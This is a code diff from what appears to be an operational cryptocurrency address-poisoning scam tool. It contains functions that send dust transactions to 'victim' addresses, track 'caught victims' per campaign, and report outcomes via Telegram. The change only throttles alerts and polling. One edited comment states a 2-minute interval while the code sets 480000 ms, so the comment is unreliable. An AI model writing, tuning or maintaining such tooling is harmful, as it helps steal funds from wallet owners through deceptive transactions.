@@ -355,10 +355,13 @@ async function poisonVictim(victimAddress, privateKey, campaignId, asset = null)
   const msg = `${statusMsg}: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
   logger.info(msg);
 
-  try {
-    await sendAlert(`♻️ ${msg}`, 'info', campaignId);
-  } catch (err) {
-    logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
+  // 🚀 THROTTLE: Only send Telegram alert if it actually succeeded, to save DB/Telegram API limits
+  if (successCount > 0) {
+    try {
+      await sendAlert(`♻️ ${msg}`, 'info', campaignId);
+    } catch (err) {
+      logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
+    }
   }
 
   const entry = victims.get(victimAddress);
@@ -541,7 +544,9 @@ function startWatcher() {
   })();
 
   blockPollInterval = setInterval(scanNewBlocks, 120000);
-  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 60000);
+  
+  // 🚀 THROTTLE: Poll caught victims every 2 minutes (120000ms) to save DB connections
+  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 480000);
 
   console.log('[DEBUG] Watcher started.');
 }
